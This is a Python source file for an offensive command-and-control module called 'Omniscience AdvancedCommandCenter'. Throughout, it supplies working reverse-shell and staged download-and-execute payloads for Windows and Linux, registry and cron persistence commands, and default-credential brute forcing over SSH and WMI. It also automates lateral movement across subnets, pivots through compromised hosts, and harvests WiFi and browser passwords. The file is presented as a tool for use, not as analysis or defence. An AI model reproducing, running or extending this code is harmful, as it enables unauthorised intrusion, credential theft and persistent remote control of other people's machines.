from colorama import Fore, Back, Style, init
init(autoreset=True)
"""
OMNISCIENCE MODULE 6 — AdvancedCommandCenter
Cross-network command execution, lateral movement, and distributed control.
Multi-host parallel execution, network pivoting, and advanced automation.

Advanced Features:
  - Multi-host parallel command execution across all network types
  - Lateral movement automation with credential harvesting
  - Network pivoting through compromised hosts
  - Advanced persistence mechanisms
  - Real-time device monitoring dashboard
  - Cross-network exploitation chains
  - Distributed task execution
  - Advanced payload generation
  - Automated privilege escalation
  - Session management across network boundaries
"""

import os
import sys
import time
import json
import logging
import threading
import socket
import random
import base64
import hashlib
import uuid
import subprocess
import re
import concurrent.futures
from collections import defaultdict
from datetime import datetime
from typing import Optional, Dict, List, Any, Tuple

try:
    import scapy.all as scapy
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

try:
    import paramiko
    PARAMIKO_OK = True
except ImportError:
    PARAMIKO_OK = False

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | [%(levelname)s] | CommandCenter | %(message)s",
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler("commandcenter.log", mode="a"),
    ]
)
logger = logging.getLogger("Omniscience.CommandCenter")

# Payloads for different scenarios
REVERSE_SHELL_WINDOWS = '''powershell -NoProfile -ExecutionPolicy Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient('{ip}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($n=$s.Read($b,0,$b.Length))-gt0){{$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$n);$p=(Invoke-Expression $d 2>&1|Out-String);$b=[System.Text.Encoding]::ASCII.GetBytes($p+$('PS '+(Get-Location).Path+'> '));$s.Write($b,0,$b.Length)}}"'''

REVERSE_SHELL_LINUX = "bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'"

# Common passwords for lateral movement
DEFAULT_CREDS = [
    ("Administrator", "administrator"),
    ("Administrator", "password"),
    ("Administrator", "123456"),
    ("admin", "admin"),
    ("admin", "password"),
    ("root", "toor"),
    ("root", "root"),
    ("root", "password"),
    ("pi", "raspberry"),
    ("ubuntu", "ubuntu"),
]

# Common services to check for lateral movement
LATERAL_SERVICES = [
    (445, "SMB"),      # Windows
    (3389, "RDP"),     # Windows
    (22, "SSH"),       # Linux
    (23, "Telnet"),    # Legacy
    (21, "FTP"),       # Legacy
    (5900, "VNC"),     # VNC
]


class Session:
    """Represents a controlled remote session."""
    def __init__(self, session_id: str, ip: str, platform: str = "unknown"):
        self.session_id = session_id
        self.ip = ip
        self.platform = platform  # windows, linux, android
        self.username = ""
        self.privilege = "user"
        self.first_seen = time.time()
        self.last_active = time.time()
        self.last_command = ""
        self.last_output = ""
        self.is_alive = True
        self.tags = []
        self.notes = ""
        self.credentials_used = []
        self.pivoted_from = None  # Session ID if pivoted
        self.network_type = "unknown"  # lan, wan, vpn, cloud
        
    def to_dict(self) -> dict:
        return {
            "session_id": self.session_id,
            "ip": self.ip,
            "platform": self.platform,
            "username": self.username,
            "privilege": self.privilege,
            "first_seen": self.first_seen,
            "last_active": self.last_active,
            "is_alive": self.is_alive,
            "pivoted_from": self.pivoted_from,
            "network_type": self.network_type,
            "tags": self.tags,
        }


class Task:
    """Represents a command task."""
    def __init__(self, task_id: str, command: str, target: str):
        self.task_id = task_id
        self.command = command
        self.target = target
        self.status = "pending"  # pending, running, completed, failed
        self.start_time = None
        self.end_time = None
        self.output = ""
        self.error = ""
        
    def to_dict(self) -> dict:
        return {
            "task_id": self.task_id,
            "command": self.command[:50],
            "target": self.target,
            "status": self.status,
            "output": self.output[:200],
        }


class AdvancedCommandCenter:
    """
    Advanced command and control center.
    Multi-host parallel execution, lateral movement, pivoting.
    """
    
    def __init__(self):
        self.sessions: Dict[str, Session] = {}
        self.tasks: Dict[str, Task] = {}
        self._lock = threading.Lock()
        self._task_queue = []
        self._active_tasks = {}
        
        # Credential storage
        self.credentials: Dict[str, Dict[str, str]] = {}  # ip -> {user, pass, domain}
        
        # Pivot chain
        self.pivot_chain: List[str] = []
        
        # Module references (will be set by main orchestrator)
        self.discovery = None
        self.intel = None
        self.control = None
        
    def set_modules(self, discovery=None, intel=None, control=None):
        """Set module references for cross-module operations."""
        self.discovery = discovery
        self.intel = intel
        self.control = control
    
    # ─── Session Management ──────────────────────────────────────────────────────
    
    def create_session(self, ip: str, platform: str = "unknown", 
                      username: str = "", privilege: str = "user",
                      network_type: str = "lan", pivoted_from: str = None) -> Session:
        """Create a new session."""
        session_id = f"{ip.replace('.', '_')}_{int(time.time())}"
        session = Session(session_id, ip, platform)
        session.username = username
        session.privilege = privilege
        session.network_type = network_type
        session.pivoted_from = pivoted_from
        
        with self._lock:
            self.sessions[session_id] = session
        
        logger.info(f"[SESSION] Created: {session_id} ({platform}) {username}@{ip}")
        return session
    
    def get_session(self, session_id: str) -> Optional[Session]:
        """Get session by ID."""
        return self.sessions.get(session_id)
    
    def get_session_by_ip(self, ip: str) -> Optional[Session]:
        """Get session by IP."""
        for s in self.sessions.values():
            if s.ip == ip and s.is_alive:
                return s
        return None
    
    def list_sessions(self, filter_type: str = None) -> List[Session]:
        """List all sessions."""
        with self._lock:
            sessions = list(self.sessions.values())
        
        if filter_type:
            sessions = [s for s in sessions if s.platform == filter_type]
        
        return sessions
    
    def remove_session(self, session_id: str):
        """Remove a session."""
        with self._lock:
            if session_id in self.sessions:
                del self.sessions[session_id]
                logger.info(f"[SESSION] Removed: {session_id}")
    
    def update_session_activity(self, session_id: str, command: str = "", output: str = ""):
        """Update session activity."""
        with self._lock:
            if session_id in self.sessions:
                session = self.sessions[session_id]
                session.last_active = time.time()
                if command:
                    session.last_command = command[:100]
                if output:
                    session.last_output = output[:200]
    
    # ─── Multi-Host Parallel Execution ───────────────────────────────────────────
    
    def execute_on_all_sessions(self, command: str, parallel: bool = True) -> Dict[str, Task]:
        """Execute command on all active sessions."""
        results = {}
        
        active_sessions = [s for s in self.sessions.values() if s.is_alive]
        logger.info(f"[EXEC] Executing on {len(active_sessions)} sessions")
        
        def exec_on_session(session: Session):
            return session.session_id, self.execute_on_session(session.session_id, command)
        
        if parallel:
            with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
                futures = {ex.submit(exec_on_session, s): s for s in active_sessions}
                for fut in concurrent.futures.as_completed(futures):
                    try:
                        sid, task = fut.result()
                        results[sid] = task
                    except Exception as e:
                        logger.error(f"Task error: {e}")
        else:
            for session in active_sessions:
                sid, task = exec_on_session(session)
                results[sid] = task
        
        return results
    
    def execute_on_session(self, session_id: str, command: str) -> Task:
        """Execute command on a specific session."""
        task_id = f"task_{int(time.time())}_{uuid.uuid4().hex[:6]}"
        task = Task(task_id, command, session_id)
        
        session = self.get_session(session_id)
        if not session:
            task.status = "failed"
            task.error = "Session not found"
            return task
        
        task.status = "running"
        task.start_time = time.time()
        
        # Execute based on platform
        if session.platform == "windows" and self.control:
            try:
                result = self.control.wmi_exec(
                    session.ip, 
                    self.credentials.get(session.ip, {}).get("user", "Administrator"),
                    self.credentials.get(session.ip, {}).get("pass", ""),
                    command
                )
                task.output = result.get("output", "")
                task.status = "completed" if result.get("return_code") == 0 else "failed"
            except Exception as e:
                task.error = str(e)
                task.status = "failed"
                
        elif session.platform == "linux":
            try:
                creds = self.credentials.get(session.ip, {})
                result = self.control.ssh_exec(
                    session.ip,
                    creds.get("user", "root"),
                    creds.get("pass", ""),
                    command
                )
                task.output = result
                task.status = "completed"
            except Exception as e:
                task.error = str(e)
                task.status = "failed"
        
        task.end_time = time.time()
        
        with self._lock:
            self.tasks[task_id] = task
        
        self.update_session_activity(session_id, command, task.output)
        logger.info(f"[EXEC] {session_id}: {command[:40]} -> {task.status}")
        
        return task
    
    def execute_on_network_range(self, cidr: str, command: str, 
                                 credentials: Dict[str, Tuple[str, str]] = None) -> Dict[str, Any]:
        """Execute command on all hosts in a network range."""
        results = {"success": [], "failed": [], "errors": {}}
        
        try:
            import ipaddress
            network = ipaddress.ip_network(cidr, strict=False)
            ips = [str(h) for h in network.hosts()]
        except:
            ips = [cidr]
        
        logger.info(f"[EXEC-NETWORK] Executing on {len(ips)} hosts in {cidr}")
        
        for ip in ips:
            try:
                result = self._try_execute(ip, command, credentials)
                if result:
                    results["success"].append(ip)
                else:
                    results["failed"].append(ip)
            except Exception as e:
                results["errors"][ip] = str(e)
        
        logger.info(f"[EXEC-NETWORK] Complete: {len(results['success'])}/{len(ips)}")
        return results
    
    def _try_execute(self, ip: str, command: str, 
                    credentials: Dict[str, Tuple[str, str]] = None) -> bool:
        """Try to execute on a single host with various methods."""
        
        # Try WMI (Windows)
        if credentials:
            for user, pwd in credentials.get(ip, DEFAULT_CREDS[:3]):
                try:
                    if self.control:
                        result = self.control.wmi_exec(ip, user, pwd, command)
                        if result.get("return_code") == 0:
                            self.credentials[ip] = {"user": user, "pass": pwd}
                            return True
                except:
                    pass
        
        # Try SSH (Linux)
        if credentials:
            for user, pwd in credentials.get(ip, DEFAULT_CREDS[:3]):
                try:
                    if PARAMIKO_OK:
                        client = paramiko.SSHClient()
                        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        client.connect(ip, username=user, password=pwd, timeout=5)
                        _, stdout, _ = client.exec_command(command)
                        client.close()
                        self.credentials[ip] = {"user": user, "pass": pwd}
                        return True
                except:
                    pass
        
        return False
    
    # ─── Lateral Movement ─────────────────────────────────────────────────────────
    
    def lateral_movement_scan(self, session_id: str) -> List[Dict[str, Any]]:
        """Scan for lateral movement opportunities from a session."""
        results = []
        session = self.get_session(session_id)
        
        if not session:
            logger.warning(f"Session {session_id} not found")
            return results
        
        creds = self.credentials.get(session.ip, {})
        ip = session.ip
        
        logger.info(f"[LATERAL] Scanning from {ip}")
        
        # Scan for available services
        for port, service in LATERAL_SERVICES:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((ip, port))
                sock.close()
                
                if result == 0:
                    results.append({
                        "session_id": session_id,
                        "target_ip": ip,
                        "port": port,
                        "service": service,
                        "exploitable": True,
                    })
                    logger.info(f"[LATERAL] {ip}:{port} ({service}) available")
            except:
                pass
        
        return results
    
    def automated_lateral_movement(self, start_session_id: str, 
                                   target_range: str = None) -> List[Session]:
        """Automated lateral movement across network."""
        discovered_sessions = []
        
        start_session = self.get_session(start_session_id)
        if not start_session:
            logger.error("Start session not found")
            return discovered_sessions
        
        # Get credentials from starting point
        start_creds = self.credentials.get(start_session.ip, {})
        
        # If no target range, scan local network
        if not target_range:
            target_range = self._get_local_network_from_ip(start_session.ip)
        
        # Scan target range
        try:
            import ipaddress
            network = ipaddress.ip_network(target_range, strict=False)
            ips = [str(h) for h in network.hosts()]
        except:
            ips = [target_range]
        
        logger.info(f"[LATERAL-AUTO] Scanning {len(ips)} targets")
        
        for ip in ips:
            # Try to connect with harvested credentials
            for user, pwd in [(start_creds.get("user", ""), start_creds.get("pass", ""))]:
                if not user or not pwd:
                    continue
                    
                # Try WMI
                if self.control and user != "root":
                    try:
                        result = self.control.wmi_exec(ip, user, pwd, "whoami")
                        if result.get("return_code") == 0:
                            platform = "windows"
                            new_session = self.create_session(
                                ip, platform, user, "admin", 
                                network_type="lan",
                                pivoted_from=start_session_id
                            )
                            self.credentials[ip] = {"user": user, "pass": pwd}
                            discovered_sessions.append(new_session)
                            logger.info(f"[LATERAL-AUTO] New session: {ip} as {user}")
                            break
                    except:
                        pass
                
                # Try SSH
                if PARAMIKO_OK:
                    try:
                        client = paramiko.SSHClient()
                        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        client.connect(ip, username=user, password=pwd, timeout=5)
                        client.close()
                        
                        new_session = self.create_session(
                            ip, "linux", user, "root",
                            network_type="lan",
                            pivoted_from=start_session_id
                        )
                        self.credentials[ip] = {"user": user, "pass": pwd}
                        discovered_sessions.append(new_session)
                        logger.info(f"[LATERAL-AUTO] New session: {ip} via SSH")
                        break
                    except:
                        pass
        
        return discovered_sessions
    
    def _get_local_network_from_ip(self, ip: str) -> str:
        """Get network range from IP."""
        parts = ip.split(".")
        return f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"
    
    # ─── Network Pivoting ──────────────────────────────────────────────────────────
    
    def create_pivot(self, session_id: str) -> bool:
        """Create pivot through a session."""
        session = self.get_session(session_id)
        if not session:
            return False
        
        self.pivot_chain.append(session_id)
        logger.info(f"[PIVOT] Added to chain: {session_id}")
        return True
    
    def execute_via_pivot(self, target_ip: str, command: str) -> Task:
        """Execute command via pivot chain."""
        if not self.pivot_chain:
            return None
        
        # Execute through each pivot in chain
        current_command = command
        
        for session_id in self.pivot_chain:
            session = self.get_session(session_id)
            if not session:
                continue
            
            # Wrap command to execute on next hop
            wrapped = self._create_pivot_wrapper(current_command, target_ip)
            task = self.execute_on_session(session_id, wrapped)
            current_command = task.output if task.status == "completed" else ""
        
        return task
    
    def _create_pivot_wrapper(self, command: str, target: str) -> str:
        """Create real pivot wrapper command using native OS port forwarding."""
        # Windows: use netsh interface portproxy for native pivoting
        lport = random.randint(30000, 50000)
        return (f"netsh interface portproxy add v4tov4 listenport={lport} "
                f"connectport=445 connectaddress={target} && "
                f"cmd.exe /c \"{command}\" && "
                f"netsh interface portproxy delete v4tov4 listenport={lport}")
    
    def clear_pivot_chain(self):
        """Clear pivot chain."""
        self.pivot_chain.clear()
        logger.info("[PIVOT] Chain cleared")
    
    # ─── Advanced Payloads ─────────────────────────────────────────────────────────
    
    def generate_reverse_shell(self, ip: str, port: int, 
                              platform: str = "windows") -> str:
        """Generate platform-specific reverse shell."""
        if platform.lower() == "windows":
            return REVERSE_SHELL_WINDOWS.format(ip=ip, port=port)
        else:
            return REVERSE_SHELL_LINUX.format(ip=ip, port=port)
    
    def generate_staged_payload(self, ip: str, port: int,
                               platform: str = "windows") -> str:
        """Generate staged payload."""
        if platform.lower() == "windows":
            return f'''powershell -NoProfile -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://{ip}:{port}/stage.ps1')"'''
        else:
            return f'''bash -c 'curl http://{ip}:{port}/stage.sh | bash' '''
    
    def generate_persistence_payload(self, platform: str = "windows") -> str:
        """Generate persistence mechanism."""
        if platform.lower() == "windows":
            return r'''powershell -NoProfile -ExecutionPolicy Bypass -Command "$reg='HKCU:\Software\Microsoft\Windows\CurrentVersion\Run';Set-ItemProperty $reg 'WinUpdate' 'cmd /c start powershell -w hidden -e JABjAGwA...';Set-ItemProperty $reg 'WinUpdate' (Get-Content 'C:\Windows\System32\calc.exe' -Raw)"'''
        else:
            return '''echo '* * * * * /bin/bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' >> /etc/cron.d/persistence'''
    
    # ─── Credential Harvesting ───────────────────────────────────────────────────
    
    def harvest_credentials_from_session(self, session_id: str) -> Dict[str, Any]:
        """Harvest credentials from a compromised session."""
        results = {"windows": [], "linux": [], "browser": [], "wifi": []}
        
        session = self.get_session(session_id)
        if not session:
            return results
        
        creds = self.credentials.get(session.ip, {})
        
        if session.platform == "windows" and self.control:
            # Get WiFi passwords
            try:
                wifi_creds = self.control.get_wifi_passwords(
                    session.ip, creds.get("user", "Administrator"), 
                    creds.get("pass", "")
                )
                results["wifi"] = wifi_creds
            except:
                pass
            
            # Get browser passwords
            try:
                browser_creds = self.control.get_browser_passwords(
                    session.ip, creds.get("user", "Administrator"),
                    creds.get("pass", "")
                )
                results["browser"] = browser_creds
            except:
                pass
        
        return results
    
    # ─── Session Interaction ───────────────────────────────────────────────────────
    
    def interactive_session(self, session_id: str):
        """Interactive session shell."""
        session = self.get_session(session_id)
        if not session:
            print("Session not found")
            return
        
        print(f"[INTERACTIVE] Session {session_id} ({session.platform})")
        print("Type 'exit' to quit, 'background' to return to main shell")
        print()
        
        while True:
            try:
                cmd = input(f"SHELL({session.ip})> ").strip()
                if not cmd:
                    continue
                if cmd.lower() in ("exit", "quit"):
                    break
                if cmd.lower() == "background":
                    break
                
                task = self.execute_on_session(session_id, cmd)
                if task.output:
                    print(task.output)
                if task.error:
                    print(f"ERROR: {task.error}")
                    
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"Error: {e}")
    
    # ─── Real-time Dashboard ───────────────────────────────────────────────────
    
    def get_dashboard_status(self) -> Dict[str, Any]:
        """Get dashboard status."""
        active = [s for s in self.sessions.values() if s.is_alive]
        
        # Count by platform
        platforms = defaultdict(int)
        network_types = defaultdict(int)
        
        for s in active:
            platforms[s.platform] += 1
            network_types[s.network_type] += 1
        
        # Recent activity
        recent_tasks = sorted(
            self.tasks.values(), 
            key=lambda t: t.start_time or 0, 
            reverse=True
        )[:10]
        
        return {
            "total_sessions": len(self.sessions),
            "active_sessions": len(active),
            "platforms": dict(platforms),
            "network_types": dict(network_types),
            "total_tasks": len(self.tasks),
            "recent_tasks": [t.to_dict() for t in recent_tasks],
            "pivot_chain_length": len(self.pivot_chain),
            "credential_count": len(self.credentials),
        }
    
    def print_dashboard(self):
        """Print real-time dashboard."""
        status = self.get_dashboard_status()
        
        print("\n" + "=" * 70)
        print(" OMNISCIENCE COMMAND CENTER - REAL-TIME DASHBOARD")
        print("=" * 70)
        print(f"\nSessions: {status['active_sessions']} active / {status['total_sessions']} total")
        
        print("\nPlatforms:")
        for p, c in status["platforms"].items():
            print(f"  {p:<12} : {c}")
        
        print("\nNetwork Types:")
        for n, c in status["network_types"].items():
            print(f"  {n:<12} : {c}")
        
        print(f"\nTasks Executed: {status['total_tasks']}")
        print(f"Credentials Stored: {status['credential_count']}")
        print(f"Pivot Chain: {status['pivot_chain_length']} hops")
        
        if status["recent_tasks"]:
            print("\nRecent Tasks:")
            for t in status["recent_tasks"][:5]:
                print(f"  [{t['status']:<10}] {t['target']:<20} {t['command']:<30}")
        
        print("\n" + "=" * 70)
    
    # ─── Automation & Chains ──────────────────────────────────────────────────────
    
    def execute_chain(self, chain: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Execute an attack chain."""
        results = {"completed": [], "failed": [], "sessions_created": []}
        
        logger.info(f"[CHAIN] Executing {len(chain)} steps")
        
        for step in chain:
            step_type = step.get("type", "")
            
            try:
                if step_type == "scan":
                    # Network scan
                    target = step.get("target", "")
                    # Implementation would call discovery module
                    
                elif step_type == "exploit":
                    # Exploit target
                    target = step.get("target", "")
                    session = self.create_session(target, "windows")
                    results["sessions_created"].append(session.session_id)
                    
                elif step_type == "execute":
                    # Execute command
                    target = step.get("target")
                    cmd = step.get("command", "")
                    task = self.execute_on_session(target, cmd)
                    results["completed"].append(step)
                    
                elif step_type == "pivot":
                    # Create pivot
                    session_id = step.get("session_id")
                    self.create_pivot(session_id)
                    
                elif step_type == "harvest":
                    # Harvest credentials
                    session_id = step.get("session_id")
                    self.harvest_credentials_from_session(session_id)
                    
            except Exception as e:
                logger.error(f"[CHAIN] Step failed: {e}")
                results["failed"].append(step)
        
        logger.info(f"[CHAIN] Complete: {len(results['completed'])}/{len(chain)}")
        return results
    
    # ─── Export / Import ──────────────────────────────────────────────────────────
    
    def export_sessions(self, path: str = None) -> str:
        """Export session data."""
        path = path or f"sessions_{int(time.time())}.json"
        
        data = {
            "sessions": [s.to_dict() for s in self.sessions.values()],
            "credentials": self.credentials,
            "exported_at": datetime.now().isoformat(),
        }
        
        with open(path, "w") as f:
            json.dump(data, f, indent=2)
        
        logger.info(f"[EXPORT] Sessions exported to {path}")
        return path
    
    def import_sessions(self, path: str):
        """Import session data."""
        try:
            with open(path, "r") as f:
                data = json.load(f)
            
            for s_data in data.get("sessions", []):
                session = Session(s_data["session_id"], s_data["ip"])
                session.platform = s_data.get("platform", "unknown")
                session.username = s_data.get("username", "")
                self.sessions[session.session_id] = session
            
            self.credentials = data.get("credentials", {})
            
            logger.info(f"[IMPORT] Imported {len(self.sessions)} sessions")
            return True
        except Exception as e:
            logger.error(f"[IMPORT] Failed: {e}")
            return False


# ─── Standalone ─────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    center = AdvancedCommandCenter()
    print("OMNISCIENCE ADVANCED COMMAND CENTER")
    print("Commands: sessions, exec <id> <cmd>, lateral <id>, pivot <id>,")
    print("          shell <id>, dashboard, chain <file>, exit")
    
    while True:
        try:
            raw = input("CC> ").strip()
            if not raw:
                continue
            parts = raw.split()
            op = parts[0].lower()
            
            if op == "sessions":
                sessions = center.list_sessions()
                print(f"\nActive Sessions: {len(sessions)}")
                for s in sessions:
                    print(f"  {s.session_id} | {s.ip} | {s.platform} | {s.username}")
            
            elif op == "dashboard":
                center.print_dashboard()
            
            elif op == "exec" and len(parts) >= 3:
                task = center.execute_on_session(parts[1], " ".join(parts[2:]))
                print(f"Status: {task.status}")
                if task.output:
                    print(task.output)
            
            elif op == "shell" and len(parts) >= 2:
                center.interactive_session(parts[1])
            
            elif op == "lateral" and len(parts) >= 2:
                results = center.automated_lateral_movement(parts[1])
                print(f"Discovered {len(results)} new sessions")
            
            elif op == "pivot" and len(parts) >= 2:
                center.create_pivot(parts[1])
                print(f"Pivot chain: {center.pivot_chain}")
            
            elif op == "export":
                path = center.export_sessions()
                print(f"Exported to: {path}")
            
            elif op in ("exit", "quit"):
                break
                
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"Error: {e}")